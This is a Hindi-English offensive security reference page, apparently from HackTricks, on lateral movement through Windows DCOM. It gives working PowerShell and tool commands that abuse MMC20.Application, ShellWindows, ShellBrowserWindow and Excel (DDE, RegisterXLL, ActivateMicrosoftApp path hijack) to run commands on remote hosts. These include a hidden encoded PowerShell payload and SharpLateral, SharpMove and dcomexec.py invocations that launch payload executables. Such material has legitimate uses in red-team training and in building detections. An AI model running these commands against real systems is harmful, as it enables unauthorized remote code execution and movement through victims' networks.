# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM lateral movement आकर्षक है क्योंकि यह नए service या scheduled task बनाने के बजाय RPC/DCOM के माध्यम से exposed मौजूदा COM servers का reuse करता है। व्यवहार में इसका मतलब है कि initial connection आमतौर पर TCP/135 पर शुरू होती है और फिर dynamically assigned high RPC ports पर move करती है।

## Prerequisites & Gotchas

- आमतौर पर आपको target पर local administrator context चाहिए और remote COM server को remote launch/activation allow करना चाहिए।
- **March 14, 2023** के बाद से, Microsoft supported systems के लिए DCOM hardening enforce करता है। पुराने clients जो low activation authentication level request करते हैं, वे fail हो सकते हैं जब तक कि वे कम से कम `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY` negotiate न करें। Modern Windows clients आमतौर पर auto-raised होते हैं, इसलिए current tooling सामान्यतः काम करता रहता है।
- Manual या scripted DCOM execution के लिए आमतौर पर TCP/135 के साथ target का dynamic RPC port range भी चाहिए। अगर आप Impacket के `dcomexec.py` का उपयोग कर रहे हैं और command output वापस चाहते हैं, तो आमतौर पर `ADMIN$` (या किसी अन्य writable/readable share) पर SMB access भी चाहिए।
- अगर RPC/DCOM काम करता है लेकिन SMB blocked है, तो `dcomexec.py -nooutput` फिर भी blind execution के लिए useful हो सकता है।

Quick checks:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

**इस technique के बारे में और जानकारी के लिए मूल post देखें [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**

Distributed Component Object Model (DCOM) objects नेटवर्क-आधारित interactions के लिए objects के साथ एक दिलचस्प capability प्रदान करते हैं। Microsoft DCOM और Component Object Model (COM) दोनों के लिए व्यापक documentation देता है, जो [यहाँ DCOM के लिए](https://msdn.microsoft.com/en-us/library/cc226801.aspx) और [यहाँ COM के लिए](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>) उपलब्ध है। DCOM applications की एक list PowerShell command का उपयोग करके प्राप्त की जा सकती है:
```bash
Get-CimInstance Win32_DCOMApplication
```
The COM object, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), MMC snap-in operations की scripting को सक्षम बनाता है। विशेष रूप से, इस object में `Document.ActiveView` के अंतर्गत एक `ExecuteShellCommand` method होता है। इस method के बारे में अधिक जानकारी [here](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>) पर मिल सकती है। इसे चलाकर देखें:

यह feature एक DCOM application के माध्यम से network पर commands execute करने की सुविधा देता है। DCOM के साथ remotely एक admin के रूप में interact करने के लिए, PowerShell का उपयोग इस प्रकार किया जा सकता है:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
यह कमांड DCOM application से connect करती है और COM object का एक instance return करती है। फिर ExecuteShellCommand method को invoke करके remote host पर एक process execute किया जा सकता है। इस process में निम्न steps शामिल हैं:

Check methods:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
RCE प्राप्त करें:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
अंतिम argument window style है। `7` window को minimized रखता है। Operationally, MMC-based execution आमतौर पर remote `mmc.exe` process को spawn कराती है, जो नीचे दिए गए Explorer-backed objects से अलग है।

## ShellWindows & ShellBrowserWindow

**इस technique के बारे में और जानकारी के लिए original post देखें [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

**MMC20.Application** object में explicit "LaunchPermissions" की कमी पाई गई थी, और यह default permissions पर गिरता है जो Administrators access को allow करती हैं। अधिक विवरण के लिए, thread [here](https://twitter.com/tiraniddo/status/817532039771525120) देखा जा सकता है, और explicit Launch Permission के बिना objects को filter करने के लिए [@tiraniddo](https://twitter.com/tiraniddo) के OleView .NET के उपयोग की सिफारिश की जाती है।

दो specific objects, `ShellBrowserWindow` और `ShellWindows`, को उनकी explicit Launch Permissions की कमी के कारण highlight किया गया था। `HKCR:\AppID\{guid}` के तहत `LaunchPermission` registry entry का न होना explicit permissions के अभाव को दर्शाता है।

`MMC20.Application` की तुलना में, ये objects अक्सर OPSEC perspective से अधिक quiet होते हैं क्योंकि command आमतौर पर remote host पर `mmc.exe` के बजाय `explorer.exe` के child के रूप में end होती है।

### ShellWindows

`ShellWindows` के लिए, जिसमें ProgID नहीं है, .NET methods `Type.GetTypeFromCLSID` और `Activator.CreateInstance` इसके AppID का उपयोग करके object instantiation को आसान बनाते हैं। यह process `ShellWindows` के CLSID को retrieve करने के लिए OleView .NET का leverage करती है। एक बार instantiate हो जाने पर, `WindowsShell.Item` method के माध्यम से interaction संभव है, जिससे `Document.Application.ShellExecute` जैसी method invocation होती है।

Object को instantiate करने और remotely commands execute करने के लिए example PowerShell commands दिए गए थे:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow` समान है, लेकिन आप इसे सीधे इसके CLSID के जरिए instantiate कर सकते हैं और `Document.Application.ShellExecute` पर pivot कर सकते हैं:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Excel DCOM Objects के साथ Lateral Movement

DCOM Excel objects का exploit करके lateral movement हासिल किया जा सकता है। अधिक जानकारी के लिए, [Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) पर DCOM के जरिए lateral movement के लिए Excel DDE को leverage करने पर चर्चा पढ़ना बेहतर होगा।

Empire project एक PowerShell script प्रदान करता है, जो DCOM objects को manipulate करके remote code execution (RCE) के लिए Excel के उपयोग को दिखाता है। नीचे [Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) में उपलब्ध script से snippets दिए गए हैं, जो RCE के लिए Excel को abuse करने के अलग-अलग तरीकों को दिखाते हैं:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
हालिया शोध ने इस क्षेत्र को `Excel.Application` की `ActivateMicrosoftApp()` method के साथ विस्तारित किया। मुख्य विचार यह है कि Excel system `PATH` में खोज करके FoxPro, Schedule Plus, या Project जैसी legacy Microsoft applications को launch करने की कोशिश कर सकता है। अगर operator target के `PATH` का हिस्सा किसी writable location में उन अपेक्षित names में से एक के साथ payload रख सके, तो Excel उसे execute करेगा।

इस variation के लिए requirements:

- target पर Local admin
- target पर Excel installed
- target के `PATH` में किसी writable directory में payload लिखने की ability

FoxPro lookup (`FOXPROW.exe`) का practical example:
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
यदि attacking host पर local `Excel.Application` ProgID registered नहीं है, तो remote object को CLSID द्वारा instantiate करें:
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
व्यवहार में दुरुपयोग किए गए मान:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### Lateral Movement के लिए Automation Tools

इन techniques को automate करने के लिए दो tools को highlight किया गया है:

- **Invoke-DCOM.ps1**: Empire project द्वारा दिया गया एक PowerShell script, जो remote machines पर code execute करने के लिए different methods के invocation को सरल बनाता है। यह script Empire GitHub repository पर उपलब्ध है।

- **SharpLateral**: remote code execute करने के लिए designed एक tool, जिसे इस command के साथ इस्तेमाल किया जा सकता है:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Automatic Tools

- Powershell script [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) से अन्य मशीनों पर code execute करने के सभी commented तरीकों को आसानी से invoke किया जा सकता है।
- आप Impacket के `dcomexec.py` का उपयोग करके DCOM के माध्यम से remote systems पर commands execute कर सकते हैं। Current builds `ShellWindows`, `ShellBrowserWindow`, और `MMC20` support करते हैं, और default रूप से `ShellWindows` इस्तेमाल करते हैं।
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- आप [**SharpLateral**](https://github.com/mertdas/SharpLateral) का भी उपयोग कर सकते हैं:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- आप [**SharpMove**](https://github.com/0xthirteen/SharpMove) का भी उपयोग कर सकते हैं
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## संदर्भ

- [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)

{{#include ../../banners/hacktricks-training.md}}
